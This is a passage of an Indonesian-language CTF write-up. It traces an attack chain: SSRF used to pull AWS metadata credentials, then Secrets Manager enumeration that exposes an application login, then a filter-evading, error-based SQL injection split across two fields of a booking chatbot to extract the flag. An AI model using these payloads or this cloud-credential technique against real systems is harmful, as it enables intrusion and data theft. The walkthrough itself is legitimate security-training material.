&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;0.0.0.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;3000&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Kemudian kirim request seperti ini. Nantinya target akan melakukan GET requests ke url yang kita input pada server.&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-2.png"
width="1044"
height="409"
loading="lazy"
class="gallery-image"
data-flex-grow="255"
data-flex-basis="612px"
>&lt;/p>
&lt;h3 id="enumeration--exploitation---cloud">Enumeration &amp;amp; Exploitation - Cloud
&lt;/h3>&lt;p>Pada hasil exploitasi diatas, terlihat bahwa terdapat security credentials rabbit-hole-role-XXX&lt;/p>
&lt;p>Jika kita akses menggunakan SSRF sebelumnya, maka AccessKeyId, SecretAccessKey, dan token bisa kita peroleh.&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-3.png"
width="1043"
height="562"
loading="lazy"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;p>Kemudian kita lakukan enumerasi lagi menggunakan &lt;a class="link" href="https://github.com/shabarkin/aws-enumerator" target="_blank" rel="noopener"
>aws-enumerator&lt;/a>. Disini langsung diketahui bahwa user saat ini memiliki akses ke &lt;strong>amplify&lt;/strong> dan juga &lt;strong>secretsmanager&lt;/strong>&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-4.png"
width="1040"
height="262"
loading="lazy"
class="gallery-image"
data-flex-grow="396"
data-flex-basis="952px"
>
&lt;br>
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-5.png"
width="799"
height="450"
loading="lazy"
class="gallery-image"
data-flex-grow="177"
data-flex-basis="426px"
>&lt;/p>
&lt;p>Ketika di enumerasi lagi, ternyata terdapat satu application yang di deploy menggunakan amplify&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-6.png"
width="1048"
height="741"
loading="lazy"
class="gallery-image"
data-flex-grow="141"
data-flex-basis="339px"
>&lt;/p>
&lt;p>Kemudian kami melanjutkan untuk melihat details dari application tersebut. Disini kami menemukan domain yang digunakan.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-7.png"
width="1041"
height="558"
loading="lazy"
class="gallery-image"
data-flex-grow="186"
data-flex-basis="447px"
>&lt;/p>
&lt;p>Namun ketika diakses, tidak ada page yang bisa diakses sehingga menjadi 404
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-8.png"
width="1006"
height="547"
loading="lazy"
class="gallery-image"
data-flex-grow="183"
data-flex-basis="441px"
>&lt;/p>
&lt;p>Disini kami lumayan lama dan cukup bingung, sampai rekan team sasya menemukan subdomain &lt;strong>production&lt;/strong>, sesuai dengan branchName yang digunakan.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-9.png"
width="604"
height="194"
loading="lazy"
class="gallery-image"
data-flex-grow="311"
data-flex-basis="747px"
>&lt;/p>
&lt;p>Ketika diakses, kita akan diminta credentials sebelum bisa mengakses aplikasi.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-10.png"
width="671"
height="480"
loading="lazy"
class="gallery-image"
data-flex-grow="139"
data-flex-basis="335px"
>&lt;/p>
&lt;p>Berhubung enumerasi AWS tadi ada &lt;strong>secretsmanager&lt;/strong>, jadi kami melakukan enumerasi terhadap service tersebut. Disini terdapat satu secrets yang kemungkinan besar digunakan untuk application amplify ini.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-11.png"
width="1049"
height="281"
loading="lazy"
class="gallery-image"
data-flex-grow="373"
data-flex-basis="895px"
>&lt;/p>
&lt;p>Ketika diakses, kami mendapatkan credentials &lt;strong>prodtest:st4rl1ght123&lt;/strong>&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-12.png"
width="1049"
height="187"
loading="lazy"
class="gallery-image"
data-flex-grow="560"
data-flex-basis="1346px"
>&lt;/p>
&lt;p>Dengan credentials tersebut, kami pun berhasil masuk kedalam aplikasi utama.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-13.png"
width="1195"
height="682"
loading="lazy"
class="gallery-image"
data-flex-grow="175"
data-flex-basis="420px"
>&lt;/p>
&lt;h3 id="enumeration--exploitation---ai-x-web">Enumeration &amp;amp; Exploitation - AI x Web
&lt;/h3>&lt;p>Di sini terdapat chatbot yang berguna untuk membuat booking terhadap specialist yang ada.
&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-14.png"
width="487"
height="726"
loading="lazy"
class="gallery-image"
data-flex-grow="67"
data-flex-basis="160px"
>&lt;/p>
&lt;p>Setelah enumerasi cukup lama, kami akhirnya menemukan SQL Injection pada chatbot ini&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-15.png"
width="520"
height="495"
loading="lazy"
class="gallery-image"
data-flex-grow="105"
data-flex-basis="252px"
>&lt;/p>
&lt;p>Kami menemukan bahwa terdapat dua input yang vulnerable, yakni pada pertanyaan &lt;strong>“Who is the meeting with?&lt;/strong>” dan juga &lt;strong>“What is the meeting topic?”&lt;/strong>.&lt;/p>
&lt;p>Akan tetapi, kami menyadari juga bahwa input yang masuk kedalam &lt;strong>“Meeting Topic”&lt;/strong> sepertinya terkena filter seperti &lt;strong>no space&lt;/strong>, &lt;strong>no sql comments&lt;/strong>, dan juga selalu error ketika terdapat &lt;strong>dua buah single quote.&lt;/strong>&lt;/p>
&lt;p>Kami coba construct ulang kemungkinan query pada SQL, dan kira kira menjadi seperti ini&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">schedule&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">aaa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bbb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ccc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ddd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">eee&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;VULN Input 1&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;2025-03-03&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ghi&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;VULN Input 2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;something&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Dan juga SQL Injection yang terjadi adalah Blind Based, karena ketika SQL Injection berhasil di sisi database, chatbot malah menampilkan input kita dan bukan data dari SQLServer.&lt;/p>
&lt;p>&lt;img src="https://blog.lordrukie.com/p/itsec-ctf-2025/image-16.png"
width="554"
height="326"
loading="lazy"
class="gallery-image"
data-flex-grow="169"
data-flex-basis="407px"
>&lt;/p>
&lt;p>Disini kita mencoba approach lain, yakni Error Based SQL Injection (berhubung error SQL ditampilkan ke user).&lt;/p>
&lt;p>Kemudian untuk menghindari filter pada chatbot, kami menggunakan payload yang dipisah berikut:&lt;/p>
&lt;ol>
&lt;li>“Who is the meeting with?”
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">abc&amp;#39;, UPDATEXML(null,CONCAT(0x0a,(select substring(data_backup_number_404,20,50) from backup_env)),null), 123/*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>“What is the meeting topic?”
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> */ , &amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>Sehingga paylod final yang di eksekusi pada SQL Server menjadi berikut&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">INSERT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">schedule&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">aaa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">bb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">topic&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">email&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;abc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;def&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ghi&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;TEST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;mail@mail.com&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;abc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">UPDATEXML&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">CONCAT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x0a&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data_backup_number_404&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">backup_env&lt;/span>&lt;span class="p">)),&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">123&lt;/span>&lt;span class="cm">/*&amp;#39;, &amp;#39;2005-02-02&amp;#39;, &amp;#39;09:00&amp;#39;, &amp;#39;*/&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;something&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Dan ketika dijalankan, Flag pun didapatkan. Tapi karena suatu alasan. Flagnya tidak muncul secara penuh, jadi perlu adjustment pada index substring nya.&lt;/p>
